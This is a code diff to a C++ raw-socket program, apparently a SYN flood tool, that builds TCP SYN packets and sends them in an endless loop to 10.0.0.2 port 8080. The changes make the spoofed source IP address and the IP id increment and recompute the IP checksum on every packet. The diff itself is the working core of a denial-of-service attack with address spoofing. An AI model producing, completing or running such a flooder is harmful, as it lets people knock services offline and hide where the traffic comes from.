@@ -17,7 +17,7 @@ void debug_print(const std::string & msg) {
 unsigned short checksum(const char *buf, unsigned size)
 {
     unsigned sum = 0;
-    int i;
+    unsigned i;
 
     /* Accumulate checksum */
     for (i = 0; i < size - 1; i += 2)
@@ -45,9 +45,9 @@ typedef struct tcphdr TCP_HEADER;
 
 int main() {
 
-    unsigned int IP_HEADER_SIZE = sizeof(IP_HEADER);
-    unsigned int TCP_HEADER_SIZE = sizeof(TCP_HEADER);
-    unsigned int DATAGRAM_SIZE = IP_HEADER_SIZE + TCP_HEADER_SIZE;
+    unsigned IP_HEADER_SIZE = sizeof(IP_HEADER);
+    unsigned TCP_HEADER_SIZE = sizeof(TCP_HEADER);
+    unsigned DATAGRAM_SIZE = IP_HEADER_SIZE + TCP_HEADER_SIZE;
 
     // TCP/IP datagram
     // IP Header + Layer 3 (Transport Layer) Data
@@ -67,22 +67,18 @@ int main() {
     ip_header->protocol = 6; // TCP
     ip_header->check = 0;
     ip_header->daddr = inet_addr("10.0.0.2");
-
-    ip_header->saddr = inet_addr("10.0.0.3"); //TODO set each time, spoofing
-    ip_header->check = checksum((const char*)ip_header, IP_HEADER_SIZE);
+	ip_header->saddr = 0;
 
     // TCP header
     auto *tcp_header = reinterpret_cast<TCP_HEADER *>(datagram + IP_HEADER_SIZE);
 
     tcp_header->dest = htons(8080);
+	tcp_header->source = htons(8080);
     tcp_header->seq = 0;
     tcp_header->doff = 0; // TODO ?
     tcp_header->syn = 1;
     tcp_header->window = 1; // TODO ?
     tcp_header->check = 0;
-
-    tcp_header->source = htons(8080); // TODO source port no!
-    tcp_header->check = 0; // TODO
 
     const int OPTION_SET = 1;
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -99,7 +95,15 @@ int main() {
     dest_address.sin_port = htons(8080);
     dest_address.sin_addr.s_addr = inet_addr("10.0.0.2");
 
+	
+
     for (;;) {
+
+		ip_header->id = (ip_header->id + 1) % (0xFFFF);
+		ip_header->saddr = (ip_header->saddr + 1) % (0xFFFFFFFF);
+		ip_header->check = checksum((const char*)ip_header, IP_HEADER_SIZE);
+
+		tcp_header->check = 0; // TODO
 
         //Send the packet
         ssize_t bytes_sent = sendto(s, datagram, ip_header->tot_len, 0, (struct sockaddr *) &dest_address, sizeof (dest_address));
